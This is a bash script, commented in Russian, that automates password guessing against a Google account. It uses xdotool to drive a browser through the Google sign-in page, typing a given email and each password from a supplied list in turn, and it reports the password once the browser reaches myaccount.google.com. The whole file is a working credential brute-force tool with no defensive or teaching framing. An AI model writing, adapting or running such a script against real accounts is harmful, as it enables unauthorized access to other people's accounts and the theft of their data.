#!/bin/bash

# Проверка наличия необходимых аргументов
if [ "$#" -ne 3 ]; then
    echo "Использование: $0 <email> <path_to_passwords_file> <browser>"
    exit 1
fi

EMAIL="$1"
PASSWORDS_FILE="$2"
BROWSER="$3"

# Проверка существования файла с паролями
if [ ! -f "$PASSWORDS_FILE" ]; then
    echo "Файл с паролями не найден: $PASSWORDS_FILE"
    exit 1
fi

# Открытие браузера и переход на страницу входа в Google
"$BROWSER" "https://accounts.google.com/signin" &

# Ожидание загрузки страницы
sleep 5

# Чтение паролей из файла и попытка входа
while IFS= read -r password; do
    echo "Пробую пароль: $password"
    
    # Открытие новой вкладки
    xdotool key ctrl+t
    sleep 1
    
    # Переход на страницу входа в Google
    xdotool type "https://accounts.google.com/signin"
    xdotool key Return
    sleep 5
    
    # Ввод email и нажатие Enter
    xdotool type "$EMAIL"
    xdotool key Return
    sleep 3
    
    # Ввод пароля и нажатие Enter
    xdotool type "$password"
    xdotool key Return
    
    # Ожидание загрузки новой страницы
    sleep 5
    
    # Получение текущего URL
    CURRENT_URL=$(xdotool getactivewindow getwindowname | grep -oP 'https://\S+')
    
    # Проверка успешности входа
    if [[ $CURRENT_URL == *"myaccount.google.com"* ]]; then
        echo "Успешный вход с паролем: $password"
        exit 0
    fi
    
    # Закрытие текущей вкладки
    xdotool key ctrl+w
    sleep 1
done < "$PASSWORDS_FILE"

echo "Пароль не найден."
exit 1
